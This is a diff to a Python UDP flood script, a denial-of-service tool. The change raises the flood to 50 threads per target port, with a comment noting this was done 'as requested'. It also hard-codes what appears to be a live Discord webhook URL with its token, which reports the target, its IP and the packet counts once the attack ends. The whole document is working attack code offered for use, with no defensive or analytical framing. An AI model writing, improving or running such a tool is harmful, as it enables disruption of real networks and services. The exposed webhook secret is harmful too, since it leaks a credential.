@@ -40,8 +40,8 @@ except socket.gaierror:
     print("Invalid IP address or domain name.")
     sys.exit(1)
 
-# Get duration from user
-duration = input("Duration (in seconds): ")
+# Get the duration of the attack from the user
+duration = input("Duration of the attack (in seconds): ")
 
 # Convert duration to integer
 try:
@@ -52,21 +52,18 @@ except ValueError:
 
 os.system("cls" if os.name == "nt" else "clear")
 os.system("figlet Attack Starting")
-print("[ ] 0% ")
-print("[===== ] 25%")
-print("[========== ] 50%")
-print("[=============== ] 75%")
-print("[====================] 100%")
 print("Attack starting...")
 
 sent1 = 0
 sent2 = 0
-sent_all = 0
 start_time = time.time()  # Record the start time
-end_time = start_time + duration  # Calculate the end time
+
+# Number of threads to create
+num_threads = 50  # Set to 50 as requested
 
 def attack(port):
     global sent1, sent2
+    end_time = time.time() + duration  # Calculate when to stop
     while time.time() < end_time:
         sock.sendto(bytes, (ip, port))
         if port == port1:
@@ -74,56 +71,43 @@ def attack(port):
         elif port == port2:
             sent2 += 1
 
-def attack_all_ports():
-    global sent_all
-    for port in range(1, 65536):  # Loop through all UDP ports
-        if time.time() >= end_time:
-            break
-        sock.sendto(bytes, (ip, port))
-        sent_all += 1
+# Create and start threads
+threads = []
+for _ in range(num_threads):
+    thread1 = threading.Thread(target=attack, args=(port1,))
+    thread2 = threading.Thread(target=attack, args=(port2,))
+    threads.append(thread1)
+    threads.append(thread2)
+    thread1.start()
+    thread2.start()
 
-# Create threads for each port and one for all ports
-thread1 = threading.Thread(target=attack, args=(port1,))
-thread2 = threading.Thread(target=attack, args=(port2,))
-thread_all_ports = threading.Thread(target=attack_all_ports)
+# Wait for all threads to complete
+for thread in threads:
+    thread.join()
 
-# Start the threads
-thread1.start()
-thread2.start()
-thread_all_ports.start()
+# Calculate total time taken
+end_time = time.time()  # Record the end time
+total_time = end_time - start_time  # Calculate the duration
 
-# Periodically print the number of packets sent
+# Print the total time taken
+print(f"\nTotal time taken: {total_time:.2f} seconds")
+
+# Optionally, send a notification to a Discord webhook
+webhook_url = 'https://discord.com/api/webhooks/1304490243910533172/ceZNHL_lfpNCSL4MF4HbR_l7cam-Q2Sxc3hSL7iRAiA8KNL9TZ8e0ygQfnZ9KSafXQxS'  # Replace with your Discord webhook URL
+message = {
+    "content": (
+        f"Attack completed!\n"
+        f"Target: {target} ({ip})\n"
+        f"Total packets sent to port {port1}: {sent1}\n"
+        f"Total packets sent to port {port2}: {sent2}\n"
+        f"Total packets sent: {sent1 + sent2}\n"
+        f"Total time taken: {total_time:.2f} seconds"
+    )
+}
+
+# Send the message to the Discord webhook
 try:
-    while time.time() < end_time:
-        print(f"Packets sent to port {port1}: {sent1}, Packets sent to port {port2}: {sent2}, Total packets sent to all ports: {sent_all}", end='\r')
-        time.sleep(1)  # Update every second
-
-except KeyboardInterrupt:
-    print("\nAttack interrupted by user.")
-
-finally:
-    # Send notification to Discord webhook
-    webhook_url = 'YOUR_WEBHOOK_URL'  # Replace with your Discord webhook URL
-    message = {
-        "content": (
-            f"Attack completed!\n"
-            f"Target: {target} ({ip})\n"
-            f"Total packets sent to port {port1}: {sent1}\n"
-            f"Total packets sent to port {port2}: {sent2}\n"
-            f"Total packets sent to all UDP ports: {sent_all}\n"
-            f"Duration: {duration} seconds"
-        )
-    }
-    response = requests.post(webhook_url, json=message)
-    if response.status_code == 204:
-        print("Notification sent to Discord successfully.")
-    else:
-        print(f"Failed to send notification. Status code: {response.status_code}")
-
-# Wait for all threads to finish
-thread1.join()
-thread2.join()
-thread_all_ports.join()
-
-print("Attack completed.")
-print("Total packets sent to port %s: ")
+    requests.post(webhook_url, json=message)
+    print("Notification sent to Discord.")
+except Exception as e:
+    print(f"Failed to send notification: {e}")
